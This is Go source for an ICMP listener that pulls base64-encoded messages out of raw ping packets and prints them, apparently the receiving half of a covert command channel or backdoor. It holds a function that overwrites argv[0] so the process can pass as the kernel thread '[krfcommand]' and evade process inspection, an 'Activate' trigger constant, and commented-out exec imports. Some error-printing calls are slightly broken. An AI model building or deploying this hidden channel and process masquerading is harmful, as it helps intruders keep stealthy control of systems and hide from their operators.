// This is the code for the basic pingServer that will just listen for incoming ICMP
//requests with that contain the "secretMessage"

package main

import (
	"encoding/base64"
	"encoding/hex"
	//"os/exec"
	//"time"
	"fmt"
	"net"
	"os"
	"reflect"
	"unsafe"
)

const (
	secretMessage = "Activate"
)

// ChangeProcName() is a function that hooks argv[0] and renames it
// This will stand out to filesystem analysis such as lsof and the /proc directory
func ChangeProcName(name string) error {
	argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
	argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]

	n := copy(argv0, name)
	if n < len(argv0) {
		argv0[n] = 0
	}

	return nil
}

func PingListen(buf []byte, packetData int) {

	//fmt.Println("[+] The full packet data:")
	//fmt.Printf("% X\n", buf[:packetData])

	//fmt.Printf("% X\n", buf[8:16])
	// 8 bytes is for linux packets
	src := buf[8:packetData]
	// 36 bytes is for windows packets
	//src := buf[36:packetData]
	hexToString := hex.EncodeToString(src)

	//fmt.Println("\n[+] Secret message from packet:")
	//fmt.Println(hexToString)

	hexDecode, _ := hex.DecodeString(hexToString)

	base64Text := make([]byte, base64.StdEncoding.DecodedLen(len(hexDecode)))
	decode, _ := base64.StdEncoding.Decode(base64Text, []byte(hexDecode))

	// Secret string
	// incomingMessage := fmt.Sprintf("%s", base64Text[:decode])

	fmt.Println("\n[+] Output received:")
	fmt.Printf("%s\n\n", base64Text[:decode])

}

func main() {
	//	err := ChangeProcName("[krfcommand]")
	//	if err != nil {
	//		fmt.Println(err.Error())
	//	}

	// while True loop to listen for ICMP data
	for {

		protocol := "icmp"

		netaddr, err := net.ResolveIPAddr("ip4", "0.0.0.0")
		if err != nil {
			fmt.Println("[-] Error in Resolve IPAddr: %s\n", err)
		}
		conn, err := net.ListenIP("ip4:"+protocol, netaddr)
		if err != nil {
			fmt.Println("[-] Error in ListenIP: %s\n", err)
		}

		buf := make([]byte, 100000)

		packetData, _, err := conn.ReadFrom(buf)
		if err != nil {
			fmt.Println("[+] Error reading packet data, %s\n", err)
		}

		go PingListen(buf, packetData)

	}
}
